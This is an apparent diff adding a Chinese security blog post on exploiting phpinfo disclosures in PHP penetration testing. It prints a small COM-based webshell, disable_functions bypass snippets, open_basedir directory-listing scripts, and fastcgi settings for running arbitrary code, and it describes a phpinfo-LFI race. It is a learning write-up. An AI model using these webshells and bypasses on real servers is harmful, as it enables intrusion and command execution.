@@ -1,0 +1,954 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Phyb0x's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言电脑凉了，充不进去电很难受，买了块电池看看怎样，一周没有电脑的日子很难过啊。在实验室刷tools在评论里看到篇文章很不错，拿来复现下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="phpinfo信息利用">
+<meta property="og:url" content="http://yoursite.com/2018/12/01/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Phyb0x&#39;s blog">
+<meta property="og:description" content="前言电脑凉了，充不进去电很难受，买了块电池看看怎样，一周没有电脑的日子很难过啊。在实验室刷tools在评论里看到篇文章很不错，拿来复现下。">
+<meta property="og:image" content="https://i.imgur.com/vM7tmOA.png">
+<meta property="og:image" content="https://i.imgur.com/zTd8b7D.png">
+<meta property="og:image" content="https://i.imgur.com/qm8Tl9q.png">
+<meta property="og:image" content="https://i.imgur.com/e8VD0JJ.png">
+<meta property="og:image" content="https://i.imgur.com/wjQozjF.png">
+<meta property="og:image" content="https://i.imgur.com/kha1ISI.png">
+<meta property="og:image" content="https://i.imgur.com/L7SIZ0Z.png">
+<meta property="og:image" content="https://i.imgur.com/2cTWcP9.png">
+<meta property="og:image" content="https://i.imgur.com/Dt0u4Ja.png">
+<meta property="og:image" content="https://i.imgur.com/JoEN21l.png">
+<meta property="article:published_time" content="2018-12-01T03:03:19.000Z">
+<meta property="article:modified_time" content="2020-01-12T01:11:20.000Z">
+<meta property="article:author" content="Phyb0x">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.imgur.com/vM7tmOA.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/12/01/phpinfo信息利用/"/>
+
+
+
+
+
+  <title>phpinfo信息利用 | Phyb0x's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <a href="https://github.com/phyb0x" target="_blank" rel="noopener"><img style="position: absolute; top: 0; left: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_left_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Phyb0x's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/%20" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/12/01/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Phyb0x">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://b-ssl.duitang.com/uploads/item/201710/05/20171005185843_HmGKQ.jpeg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Phyb0x's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">phpinfo信息利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-12-01T11:03:19+08:00">
+                2018-12-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>电脑凉了，充不进去电很难受，买了块电池看看怎样，一周没有电脑的日子很难过啊。在实验室刷tools在评论里看到篇文章很不错，拿来复现下。</p>
+<a id="more"></a>
+
+<p>原文地址</p>
+<p><a href="http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/" target="_blank" rel="noopener">http://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/</a></p>
+<h3 id="phpinfo页面利用"><a href="#phpinfo页面利用" class="headerlink" title="phpinfo页面利用"></a>phpinfo页面利用</h3><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p><img src="https://i.imgur.com/vM7tmOA.png" alt=""></p>
+<p>获取具体版本，可以用来提权</p>
+<h4 id="extension-dir"><a href="#extension-dir" class="headerlink" title="extension_dir"></a>extension_dir</h4><p><img src="https://i.imgur.com/zTd8b7D.png" alt=""></p>
+<p>php扩展的路径，图省事没用lamp包有点捞…(这里还是说下linux不推荐用phpstudy，很多linux装了phpstudy系统会崩)</p>
+<h4 id="http-x-real-ip"><a href="#http-x-real-ip" class="headerlink" title="http_x_real_ip"></a>http_x_real_ip</h4><p>直接获取真实ip，无视代理、cdn。本地环境并没有发现这个参数，应该是ini配置问题。顺便说下<code>HTTP_X_FORWARDED_FOR</code>的区别，<code>HTTP_X_FORWARDED_FOR</code>会记录代理过程且可伪造</p>
+<h4 id="web根目录"><a href="#web根目录" class="headerlink" title="web根目录"></a>web根目录</h4><p><img src="https://i.imgur.com/qm8Tl9q.png" alt=""></p>
+<p>找不到路径，报错/找phpinfo常规操作了。</p>
+<h4 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h4><p>phpinfo-lfi  getshell 很老的洞了，看到学习下</p>
+<p>像phpinfo页面post数据可以在_FILES[“file1”]中看到上传的临时文件，先构造简单上传页面。</p>
+<p><img src="https://i.imgur.com/e8VD0JJ.png" alt=""></p>
+<p>其中PHP引擎对enctype=”multipart/form-data”这种请求的处理过程如下：</p>
+<pre><code>1、请求到达
+2、创建临时文件，并写入上传文件的内容
+3、调用相应PHP脚本进行处理，如校验名称、大小等
+4、删除临时文件</code></pre><p><img src="https://i.imgur.com/wjQozjF.png" alt=""></p>
+<p>这里可以看到，临时文件可以成功写入，配合lfi即可getshell，不过临时文件很块就会被删除，利用分块传输竞争时间绕过</p>
+<p><a href="https://www.insomniasec.com/downloads/publications/phpinfolfi.py" target="_blank" rel="noopener">https://www.insomniasec.com/downloads/publications/phpinfolfi.py</a></p>
+<p>利用脚本，不过我本地测试失败了</p>
+<p>这里说下这个漏洞感觉还是比较鸡肋(条件有点苛刻)</p>
+<pre><code>1、phpinfo
+2、开启了文件缓存
+3、没有gpc等函数限制
+4、开启lfi，有包含点</code></pre><h4 id="allow-url-include"><a href="#allow-url-include" class="headerlink" title="allow_url_include"></a>allow_url_include</h4><p>文件包含有多重要自不必多说。</p>
+<h4 id="asp-tags"><a href="#asp-tags" class="headerlink" title="asp_tags"></a>asp_tags</h4><p><img src="https://i.imgur.com/kha1ISI.png" alt=""></p>
+<p>php标签有四种格式，这个是asp风格的，默认不开启。可以上传.haccess/user.ini 绕过(php7移除)</p>
+<h4 id="disable-functions"><a href="#disable-functions" class="headerlink" title="disable_functions"></a>disable_functions</h4><p>禁用函数列表：</p>
+<pre><code>(dl)
+exec
+system
+passthru
+popen
+proc_open
+pcntl_exec
+shell_exec</code></pre><h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式:"></a>绕过方式:</h5><p>1、记得Seay代码审计里说过<code>dl()</code>函数(需要enable_dl开启)</p>
+<pre><code>&lt;?php
+//PHP5调用方法
+dl(&apos;../../../../../home/apache/htdocs/php5.so&apos;);
+spiderbiguan(&apos;uname -a&apos;);//调用函数
+?&gt;</code></pre><p>2、编译php时如果加了-–enable-pcntl选项，就可以使用pcntl_exec()来执行命令。PHP&gt;4.2.0</p>
+<pre><code>&lt;?php pcntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?&gt;
+
+#/tmp/b4dboy.sh
+#!/bin/bash
+ls -l /</code></pre><p>3、利用ImageMagick漏洞绕过disable_function(应该是要组件与扩展都有具体没测试)</p>
+<p><a href="https://www.waitalone.cn/imagemagic-bypass-disable_function.html" target="_blank" rel="noopener">https://www.waitalone.cn/imagemagic-bypass-disable_function.html</a></p>
+<p>4、利用环境变量LD_PRELOAD来绕过</p>
+<p><a href="http://www.vuln.cn/6784" target="_blank" rel="noopener">http://www.vuln.cn/6784</a>的确是一种好方法，利用起来也没有那么繁琐。</p>
+<p>5、win系统组件</p>
+<pre><code>&lt;?php
+$command=$_POST[a];
+$wsh = new COM(&apos;WScript.shell&apos;); // 生成一个COM对象
+$exec = $wsh-&gt;exec(&apos;cmd.exe /c &apos;.$command);  //调用对象方法来执行命令
+$stdout = $exec-&gt;StdOut();
+$stroutput = $stdout-&gt;ReadAll();
+echo $stroutput
+?&gt;</code></pre><h4 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h4><p>魔术引号，它是用来实现addslshes()和stripslashes()这两个功能的，对SQL注入进行防御。顺便提一嘴用了<code>addslshes()</code>除非是有编码问题要不然是不存在注入的。</p>
+<p><img src="https://i.imgur.com/L7SIZ0Z.png" alt=""></p>
+<h4 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h4><p>将用户可操作的文件限制在某目录下</p>
+<p><img src="https://i.imgur.com/2cTWcP9.png" alt=""></p>
+<h5 id="绕过方式："><a href="#绕过方式：" class="headerlink" title="绕过方式："></a>绕过方式：</h5><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">linux下绕过</a>(大佬博客我这里也复现下)</p>
+<p>1、利用DirectoryIterator + Glob 直接列举目录(linux)</p>
+<pre><code>&lt;?php
+printf(&apos;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&apos;, ini_get(&apos;open_basedir&apos;));
+$file_list = array();
+// normal files
+$it = new DirectoryIterator(&quot;glob:///*&quot;);
+foreach($it as $f) {
+    $file_list[] = $f-&gt;__toString();
+}
+// special files (starting with a dot(.))
+$it = new DirectoryIterator(&quot;glob:///.*&quot;);
+foreach($it as $f) {
+    $file_list[] = $f-&gt;__toString();
+}
+sort($file_list);
+foreach($file_list as $f){
+        echo &quot;{$f}&lt;br/&gt;&quot;;
+}
+?&gt;</code></pre><p><img src="https://i.imgur.com/Dt0u4Ja.png" alt=""></p>
+<p>2、realpath列举目录</p>
+<p>利用realpath对传入路径的回显不同加上通配符进行列举。本地环境linux就没有进行测试。</p>
+<pre><code>&lt;?php
+ini_set(&apos;open_basedir&apos;, dirname(__FILE__));
+printf(&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;, ini_get(&apos;open_basedir&apos;));
+set_error_handler(&apos;isexists&apos;);
+$dir = &apos;d:/test/&apos;;
+$file = &apos;&apos;;
+$chars = &apos;abcdefghijklmnopqrstuvwxyz0123456789_&apos;;
+for ($i=0; $i &lt; strlen($chars); $i++) { 
+    $file = $dir . $chars[$i] . &apos;&lt;&gt;&lt;&apos;;
+    realpath($file);
+}
+function isexists($errno, $errstr)
+{
+    $regexp = &apos;/File\((.*)\) is not within/&apos;;
+    preg_match($regexp, $errstr, $matches);
+    if (isset($matches[1])) {
+        printf(&quot;%s &lt;br/&gt;&quot;, $matches[1]);
+    }
+}
+?&gt;</code></pre><p>首先设置open_basedir为当前目录，并枚举d:/test/目录下的所有文件。将错误处理交给isexists函数，在isexists函数中匹配出目录名称，并打印出来。</p>
+<p>3、SplFileInfo::getRealPath列举目录</p>
+<p>不需要考虑open_basedir开不开起。</p>
+<pre><code>&lt;?php
+ini_set(&apos;open_basedir&apos;, dirname(__FILE__));
+printf(&quot;&lt;b&gt;open_basedir: %s&lt;/b&gt;&lt;br /&gt;&quot;, ini_get(&apos;open_basedir&apos;));
+$basedir = &apos;D:/test/&apos;;
+$arr = array();
+$chars = &apos;abcdefghijklmnopqrstuvwxyz0123456789&apos;;
+for ($i=0; $i &lt; strlen($chars); $i++) { 
+    $info = new SplFileInfo($basedir . $chars[$i] . &apos;&lt;&gt;&lt;&apos;);
+    $re = $info-&gt;getRealPath();
+    if ($re) {
+        dump($re);
+    }
+}
+function dump($s){
+    echo $s . &apos;&lt;br/&gt;&apos;;
+    ob_flush();
+    flush();
+}
+?&gt;</code></pre><p>还有GD库imageftbbox/imagefttext列举目录bindtextdomain暴力猜解目录，基本也都是要暴力破解，效率比较低。还有这篇文章<a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html" target="_blank" rel="noopener">php5全版本绕过open_basedir读文件脚本</a>给跪了</p>
+<h3 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h3><h4 id="imagick"><a href="#imagick" class="headerlink" title="imagick"></a>imagick</h4><p><a href="https://www.jianshu.com/p/502e39c122e6" target="_blank" rel="noopener">这个的远程执行</a></p>
+<h4 id="libxml"><a href="#libxml" class="headerlink" title="libxml"></a>libxml</h4><p>libxml 2.9以前的版本默认支持并开启了外部实体的引用，服务端解析用户提交的 xml 文件时未对 xml 文件引用的外部实体（含外部普通实体和外部参数实体）做合适的处理，会导致XXE。</p>
+<h4 id="memcache"><a href="#memcache" class="headerlink" title="memcache"></a>memcache</h4><p><a href="http://blog.nsfocus.net/memcache-unauthorized-access-exploit/" target="_blank" rel="noopener">Memcache未授权访问漏洞利用及修复</a></p>
+<p><img src="https://i.imgur.com/JoEN21l.png" alt=""></p>
+<h4 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h4><p>这个不多说了……</p>
+<h4 id="session"><a href="#session" class="headerlink" title="session"></a>session</h4><h4 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h4><h4 id="GOPHER"><a href="#GOPHER" class="headerlink" title="GOPHER"></a>GOPHER</h4><p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">利用 Gopher 协议拓展攻击面</a><br>看了下尝试复现没有成功，我的理解是首先要支持gopher协议，然后找到一个能执行curl会话的参数，构造gopher格式的payload以post格式去执行反弹shell。(并没有看懂是怎么利用的)</p>
+<h4 id="fastcgi"><a href="#fastcgi" class="headerlink" title="fastcgi"></a>fastcgi</h4><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#php-fpmfastcgi" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html#php-fpmfastcgi</a></p>
+<p>通过fastcgi传入环境变量，设置</p>
+<pre><code>&apos;PHP_VALUE&apos;: &apos;auto_prepend_file =php://input&apos;,
+&apos;PHP_ADMIN_VALUE&apos;: &apos;allow_url_include = On&apos;</code></pre><p>将执行的代码放在body中执行任意代码。</p>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>从刚接触安全的时候就知道phpinfo里有很重要的信息，然而就在前几天我还直接提了个信息泄露(还撞了，丢脸),复现完真的学到很多。</p>
+<p>参考链接：</p>
+<p><a href="https://www.freebuf.com/articles/web/79830.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/79830.html</a></p>
+<p><a href="http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0151653.html" target="_blank" rel="noopener">http://wooyun.jozxing.cc/static/bugs/wooyun-2015-0151653.html</a></p>
+<p><a href="https://bbs.ichunqiu.com/thread-3234-1-1.html" target="_blank" rel="noopener">https://bbs.ichunqiu.com/thread-3234-1-1.html</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <p><span>文章作者:</span><a href="/" title="访问 Phyb0x 的个人博客">Phyb0x</a></p>
+  <p><span>最后更新:</span>2020年01月12日 09:01:20</p>
+  <p><span>原始链接:</span><a href="/2018/12/01/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/" title="phpinfo信息利用">http://yoursite.com/2018/12/01/phpinfo%E4%BF%A1%E6%81%AF%E5%88%A9%E7%94%A8/</a></p>
+  <p><span>版权声明:</span>本博客所有文章除特别声明外，均采用 <i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank" title="Attribution-NonCommercial-ShareAlike 3.0 Unported (CC BY-NC-SA 3.0)"> BY-NC-SA 3.0 许可协议</a>，转载请注明出处！</p>  
+</div>
+
+      
+    </div>
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>万一有人点了呢！</div>
+  <button id="rewardButton" disable="enable" style="width: 80px;line-height: 38px;text-align: center;font-weight: bold;color: #fff;border-radius: 5px;
+margin:0 20px 20px 0;position: relative;overflow: hidden;color: #8c96a0;text-shadow:1px 1px 1px #fff;border:1px solid #dce1e6;box-shadow: 0 1px 2px #fff inset,0 -1px 0 #a8abae inset;background: -webkit-linear-gradient(top,#f2f3f7,#e4e8ec);background: -moz-linear-gradient(top,#f2f3f7,#e4e8ec);background: linear-gradient(top,#f2f3f7,#e4e8ec);" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    打赏
+  </button>
+  <div id="QR" style="display: none;">
+    
+      <div id="wechat" style="display: inline-block;width:150px;height:150px">
+        <img id="wechat_qr" src="/images/wechat.png" alt="Phyb0x WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+    
+    
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/12/thinkphp%E5%AE%A1%E8%AE%A1/" rel="next" title="thinkphp审计">
+                <i class="fa fa-chevron-left"></i> thinkphp审计
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/12/01/powershell%E8%BF%90%E7%94%A8/" rel="prev" title="powershell运用">
+                powershell运用 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="https://b-ssl.duitang.com/uploads/item/201710/05/20171005185843_HmGKQ.jpeg"
+                alt="Phyb0x" />
+            
+              <p class="site-author-name" itemprop="name">Phyb0x</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">33</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://cdusec.happyhacking.top" title="CDUSEC" target="_blank">CDUSEC</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://nbsec.xyz/" title="大熊's Blog" target="_blank">大熊's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://a3ura.github.io/" title="a3ura's Blog" target="_blank">a3ura's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://a-running-snail2333.github.io/blog.github.io/" title="a-running-snail's Blog" target="_blank">a-running-snail's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#phpinfo页面利用"><span class="nav-number">2.</span> <span class="nav-text">phpinfo页面利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#system"><span class="nav-number">2.1.</span> <span class="nav-text">system</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#extension-dir"><span class="nav-number">2.2.</span> <span class="nav-text">extension_dir</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#http-x-real-ip"><span class="nav-number">2.3.</span> <span class="nav-text">http_x_real_ip</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#web根目录"><span class="nav-number">2.4.</span> <span class="nav-text">web根目录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#临时文件"><span class="nav-number">2.5.</span> <span class="nav-text">临时文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#allow-url-include"><span class="nav-number">2.6.</span> <span class="nav-text">allow_url_include</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#asp-tags"><span class="nav-number">2.7.</span> <span class="nav-text">asp_tags</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#disable-functions"><span class="nav-number">2.8.</span> <span class="nav-text">disable_functions</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过方式"><span class="nav-number">2.8.1.</span> <span class="nav-text">绕过方式:</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#magic-quotes-gpc"><span class="nav-number">2.9.</span> <span class="nav-text">magic_quotes_gpc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#open-basedir"><span class="nav-number">2.10.</span> <span class="nav-text">open_basedir</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#绕过方式："><span class="nav-number">2.10.1.</span> <span class="nav-text">绕过方式：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#扩展"><span class="nav-number">3.</span> <span class="nav-text">扩展</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#imagick"><span class="nav-number">3.1.</span> <span class="nav-text">imagick</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#libxml"><span class="nav-number">3.2.</span> <span class="nav-text">libxml</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#memcache"><span class="nav-number">3.3.</span> <span class="nav-text">memcache</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#redis"><span class="nav-number">3.4.</span> <span class="nav-text">redis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#session"><span class="nav-number">3.5.</span> <span class="nav-text">session</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#xdebug"><span class="nav-number">3.6.</span> <span class="nav-text">xdebug</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#GOPHER"><span class="nav-number">3.7.</span> <span class="nav-text">GOPHER</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fastcgi"><span class="nav-number">3.8.</span> <span class="nav-text">fastcgi</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">4.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
